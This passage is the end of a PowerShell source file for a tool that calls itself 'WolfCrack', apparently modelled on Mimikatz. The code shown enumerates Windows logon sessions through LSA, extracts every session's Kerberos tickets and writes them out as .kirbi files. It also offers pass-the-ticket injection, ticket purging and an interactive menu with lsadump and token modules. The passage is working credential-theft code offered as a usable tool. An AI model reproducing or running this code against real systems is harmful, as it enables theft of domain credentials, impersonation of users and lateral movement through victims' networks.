            [System.Runtime.InteropServices.Marshal]::StructureToPtr($request,$unmanagedAddr,$false)

            $newTargetNameBuffPtr = [System.IntPtr]([System.Int64]($unmanagedAddr.ToInt64() + [System.Int64]$structSize))

            [Kerberos.Manipulate]::CopyMemory($newTargetNameBuffPtr,$tname.buffer,$tname.MaximumLength) 
            if([System.IntPtr]::Size -eq 8){$size = 24}
            else{$size = 16}
            [System.Runtime.InteropServices.Marshal]::WriteIntPtr($unmanagedAddr,$size,$newTargetNameBuffPtr)
    
            $retcode = [Kerberos.Manipulate]::LsaCallAuthenticationPackage($lsaHandle,$authPackage,$unmanagedAddr,$newStructSize,[ref]$responsePointer,[ref]$returnBufferLength,[ref]$protocolStatus)
    
            if(($retcode -eq 0) -and ($returnBufferLength -ne 0))
            {
                $response = [System.Runtime.InteropServices.Marshal]::PtrToStructure($responsePointer,[type]$responseType)
        
                $encodedTicketSize = $response.Ticket.EncodedTicketSize

                $encodedTicket = [System.Array]::CreateInstance([byte],$encodedTicketSize)
                [System.Runtime.InteropServices.Marshal]::Copy($response.Ticket.EncodedTicket,$encodedTicket,0,$encodedTicketSize)
            }

            [Kerberos.Manipulate]::LsaFreeReturnBuffer($responsePointer)
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($unmanagedAddr)

            #Saving All Tickets in Folder
            if($export)
            {
                $path = "$env:USERPROFILE\Desktop\Tickets"
                if(!(Test-Path $path)){New-Item -ItemType directory -Path $path}
                if($null -ne $ticket.LogonSession.username)
                {
                    $fileName = $ticket.LogonSession.username + "@" + $targetname.Split("/")[0] + "-" + $ticket.ServerRealm + ".kirbi"
                    if($null -ne $encodedTicket){[System.IO.File]::WriteAllBytes("$path\$fileName",$encodedTicket)}
                }
            }

            return $response.Ticket.SessionKey.KeyType
        }


        #Display all the information about the tickets
        Function DisplaySessionCreds($sessioncreds)
        {
            foreach($sessioncred in $sessioncreds)
            {
                if((@($sessioncred).Count -gt 0) -and ($sessioncred[0].LogonSession[0].LogonID.LowPart -ne "0") )
                {
                    $print_object = New-Object psobject
                    Add-Member -InputObject $print_object -MemberType NoteProperty -Name "UserName" -Value $sessioncred[0].LogonSession.username
                    Add-Member -InputObject $print_object -MemberType NoteProperty -Name "Domain" -Value $sessioncred[0].LogonSession.LogonDomain
                    Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonId" -Value ("0x{0:x}" -f $sessioncred[0].LogonSession.LogonId.LowPart)
                    Add-Member -InputObject $print_object -MemberType NoteProperty -Name "UserSid" -Value $sessioncred[0].LogonSession.Sid
                    Add-Member -InputObject $print_object -MemberType NoteProperty -Name "AuthenticationPackage" -Value $sessioncred[0].LogonSession.AuthenticationPackage
                    Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonType" -Value $sessioncred[0].LogonSession.logonType
                    Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonTime" -Value $sessioncred[0].LogonSession.logonTime
                    Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonServerDnsDomain" -Value $sessioncred[0].LogonSession.DnsDomainName
                    Add-Member -InputObject $print_object -MemberType NoteProperty -Name "UserPrincipalName" -Value $sessioncred[0].LogonSession.Upn

                    Write-Host "------------------------------------------------------------------------------------------------------------------"
                    $print_object
                    Write-Host "[*] Enumerated " @($sessioncred).Count "tickets`n" -ForegroundColor Green
                    foreach($ticket in $sessioncred)
                    {
                        Write-Host "    Service Name       : " $ticket.ServerName
                        Write-Host "    EncryptionType     : " ([Kerberos.Manipulate+EncTypes]$ticket.EncryptionType)
                        Write-Host "    Start/End/MaxRenew : " $ticket.StartTime ";" $ticket.EndTime ";" $ticket.RenewTime
                        Write-Host "    Server Name        : " $ticket.ServerName.split("/")[1] "@" $ticket.ServerRealm
                        Write-Host "    Client Name        : " $ticket.ClientName "@" $ticket.ClientRealm
                        Write-Host "    Flags              : " $ticket.TicketFlags
                        if($ticket.SessionKeyType){Write-Host "    Session Key Type   : " $ticket.SessionKeyType "`n"}
                    }
                    Write-Host "--------------------------------------------------------------------------------------------------------------------------------"
                    Write-Host "`n`n"
                }
            }
        }        

        #Main function start here!!
        $retcode = New-Object System.Int32
        $authPackage = New-Object System.Int32
        $name = "kerberos"


        $LSAString = New-Object Kerberos.Manipulate+LSA_STRING_IN
        $LSAString.Length = [uint16]$name.Length
        $LSAString.MaximumLength = [uint16]($name.Length + 1)
        $LSAString.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($name)

        $lsaHandle = GetLsaHandle

        $retcode = [Kerberos.Manipulate]::LsaLookupAuthenticationPackage($lsaHandle,[ref]$LSAString,[ref]$authPackage)
        $sessioncreds = @()

        foreach($luid in EnumerateLogonSessions)
        {
            $logonSessionData = New-Object Kerberos.Manipulate+LogonSessionData
            try{$logonSessionData = GetLogonSessionData($luid)}
            catch{continue}
    
            $sessioncred = @()

            $ticketsPointer = New-Object System.IntPtr
            $returnBufferLength = 0
            $protocolStatus = 0

            $ticketCacheRequest = New-Object Kerberos.Manipulate+KERB_QUERY_TKT_CACHE_REQUEST
            $ticketCacheRespone = New-Object Kerberos.Manipulate+KERB_QUERY_TKT_CACHE_RESPONSE
            $ticketCacheResponeType = $ticketCacheRespone.GetType()
            $ticketCacheResult = New-Object Kerberos.Manipulate+KERB_TICKET_CACHE_INFO_EX

            $ticketCacheRequest.MessageType = [Kerberos.Manipulate+KERB_PROTOCOL_MESSAGE_TYPE]::KerbQueryTicketCacheExMessage
            if(RunningAsAdmin){$ticketCacheRequest.LogonId = $logonSessionData.LogonID}
            else{$ticketCacheRequest.LogonId = New-Object Kerberos.Manipulate+LUID}
    
            $tQueryPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($ticketCacheRequest))
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ticketCacheRequest,$tQueryPtr,$false)

            $retcode = [Kerberos.Manipulate]::LsaCallAuthenticationPackage($lsaHandle,$authPackage,$tQueryPtr,[System.Runtime.InteropServices.Marshal]::SizeOf($ticketCacheRequest),[ref]$ticketsPointer,[ref]$returnBufferLength,[ref]$protocolStatus)
            if(($retcode -eq 0) -and ($ticketsPointer -ne [System.IntPtr]::Zero))
            {
                [Kerberos.Manipulate+KERB_QUERY_TKT_CACHE_RESPONSE]$ticketCacheRespone = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ticketsPointer,[type]$ticketCacheResponeType)
                $count2 = $ticketCacheRespone.CountOfTickets
                if($count2 -ne 0)
                {
                    $cacheInfoType = $ticketCacheResult.GetType()
                    $dataSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$cacheInfoType)
                    for($j = 0;$j -lt $count2;$j++)
                    {
                        [System.IntPtr]$currTicketPtr = [int64]($ticketsPointer.ToInt64() + [int](8 + $j * $dataSize))
                        [Kerberos.Manipulate+KERB_TICKET_CACHE_INFO_EX]$ticketCacheResult = [System.Runtime.InteropServices.Marshal]::PtrToStructure($currTicketPtr,[type]$cacheInfoType)

                        $ticket = New-Object psobject
                        Add-Member -InputObject $ticket -MemberType NoteProperty -name "StartTime" -value  ([datetime]::FromFileTime($ticketCacheResult.StartTime))
                        Add-Member -InputObject $ticket -MemberType NoteProperty -name "EndTime" -value  ([datetime]::FromFileTime($ticketCacheResult.EndTime))
                        Add-Member -InputObject $ticket -MemberType NoteProperty -name  "RenewTime" -value ([datetime]::FromFileTime($ticketCacheResult.RenewTime))
                        Add-Member -InputObject $ticket -MemberType NoteProperty -Name "TicketFlags" -Value ([Kerberos.Manipulate+TicketFlags]$ticketCacheResult.TicketFlags)
                        Add-Member -InputObject $ticket -MemberType NoteProperty -Name "EncryptionType" -Value $ticketCacheResult.EncryptionType
                        Add-Member -InputObject $ticket -MemberType NoteProperty -name  "ServerName" -value  ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheResult.ServerName.Buffer,$ticketCacheResult.ServerName.Length / 2))
                        Add-Member -InputObject $ticket -MemberType NoteProperty -name  "ServerRealm" -value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheResult.ServerRealm.Buffer,$ticketCacheResult.ServerRealm.Length / 2))
                        Add-Member -InputObject $ticket -MemberType NoteProperty -name  "ClientName" -value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheResult.ClientName.Buffer,$ticketCacheResult.ClientName.Length / 2))
                        Add-Member -InputObject $ticket -MemberType NoteProperty -name "ClientRealm" -value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheResult.ClientRealm.Buffer,$ticketCacheResult.ClientRealm.Length / 2))
                        Add-Member -InputObject $ticket -MemberType NoteProperty -Name "LogonSession" -Value $logonSessionData
                
                        $SessionEncType = (ExtractTicket $lsaHandle $authPackage $ticketCacheRequest.LogonId $ticket.ServerName $ticketCacheResult.TicketFlags $ticket $export)[1]

                        try
                        {
                            if($SessionEncType -ne 0 ){Add-Member -InputObject $ticket -MemberType NoteProperty -Name "SessionKeyType" -Value ([Kerberos.Manipulate+EncTypes]$SessionEncType)}
                        }
                        catch{}

                        $sessioncred += $ticket
                    }
                }
            }

            [Kerberos.Manipulate]::LsaFreeReturnBuffer($ticketsPointer)|Out-Null
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($tQueryPtr)
            $sessioncreds += @(,$sessioncred)
        }

        [Kerberos.Manipulate]::LsaDeregisterLogonProcess($lsaHandle)|Out-Null
        DisplaySessionCreds $sessioncreds

        if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM"){token "revert"|Out-Null}
    }

    #Purging kerberos tickets
    Function kerberos-purge
    {
        Function Purge($luid)
        {
            $protocolReturnBuffer = New-Object System.IntPtr
            $ReturnBufferLength = New-Object System.Int32
            $ProtocolStatus = New-Object System.Int32

            $request = New-Object Kerberos.Manipulate+KERB_PURGE_TKT_CACHE_REQUEST
            $request.MessageType = [Kerberos.Manipulate+KERB_PROTOCOL_MESSAGE_TYPE]::KerbPurgeTicketCacheMessage
            $request.LogonId = $luid
            $requestType = $request.GetType()

            $inputBufferSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$requestType)
            $inputBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($inputBufferSize)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($request,$inputBuffer,$false)

            $ntstats = [Kerberos.Manipulate]::LsaCallAuthenticationPackage($lsaHandle,$authPackage,$inputBuffer,$inputBufferSize,[ref]$protocolReturnBuffer,[ref]$ReturnBufferLength,[ref]$ProtocolStatus)

            if($inputBuffer -ne [System.IntPtr]::Zero)
            {
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($inputBuffer)
                Write-Host "[*] Tickets Successfully Purged!!" -ForegroundColor Green
            }
        }

        #Main Function start HERE!!!
        $lsahandle = GetLsaHandle

        $retcode = New-Object System.Int32
        $authPackage = New-Object System.Int32
        $name = "kerberos"


        $LSAString = New-Object Kerberos.Manipulate+LSA_STRING_IN
        $LSAString.Length = [uint16]$name.Length
        $LSAString.MaximumLength = [uint16]($name.Length + 1)
        $LSAString.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($name)
        $retcode = [Kerberos.Manipulate]::LsaLookupAuthenticationPackage($lsaHandle,[ref]$LSAString,[ref]$authPackage)

        $strluid = GetCurrentLuid
        $intluid = [convert]::ToInt32($strluid,16)
        $luid = New-Object Kerberos.Manipulate+LUID
        $luid.LowPart = $intluid

        Purge $luid

        [Kerberos.Manipulate]::LsaDeregisterLogonProcess($lsaHandle)|Out-Null
        if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM"){token "revert"|Out-Null}
    }

    Function kerberos-klist
    {
        klist
    }

    $options = $option.split("/")
    $SpaceOptions = $options[0].split()
    $path_to_ticket = ($SpaceOptions[1] + ":" + $answer[2]).Replace('"','')
    switch ($Spaceoptions[0])
    {
        "list"  {if($options[1] -eq "export"){kerberos-list $True}
                 elseif($null -eq $options[1]){kerberos-list $false}
                 else {Write-Host "[x] This Option Does Not Exist!!(write 'help::kerberos' for help)"}}
        "ptt"   {kerberos-ptt $path_to_ticket}
        "purge" {kerberos-purge}
        "klist" {kerberos-klist}
        default {Write-Host "[x] This Option Does Not Exist!!(write 'help::kerberos' for help)"}
    }
}


#Shows helpful information about using the software
Function help($option)
{
    $options = "Modules are:`n1.privilege`n2.ts`n3.token`n4.lsadump`n5.exit`nIn order to see help about each of them write help::<ModuleName>"
    switch($option)
    {
        "privilege"    {Get-Help Privilege -Full}
        "ts"           {Get-Help ts -Full}
        "token"        {Get-Help token -Full}
        "lsadump"      {Get-Help lsadump -Full}
        "kerberos"     {Get-Help kerberos -Full}
        default        {Write-Host $options}
    }
}
      

$wolf = @"
        
        
        WolfCrack By Yuval Weber
        _
       / \      _-'
     _/|  \-''- _ /
__-' { |          \
    /             \
    /       "o.  |o }
    |            \ ;
                  ',
       \_         __\
         ''-_    \.//
           / '-____'
          /
        _'
      _-


"@ 
Write-Host $wolf -ForegroundColor Green
while ($True)
{
    write-host "`nWolfCrack # " -NoNewline
    $answer = Read-Host
    $answer = $answer.Split(":").Where({$_ -ne ""})

    if($null -ne $answer[1])
    {
    	switch($answer[0])
    	{
        	"privilege" {Privilege $answer[1]}
        	"ts"        {ts $answer[1]}
        	"token"     {token $answer[1]}
        	"lsadump"   {lsadump $answer[1]}
        	"kerberos"  {kerberos $answer[1]}
        	"help"      {help $answer[1]}
        	default     {Write-Host "This Option Does Not Exist!!(write 'help')" -ForegroundColor Red}
        }
    }
    else
    {
    	if($answer[0] -eq "exit"){break}
    	else{help}
    }
}


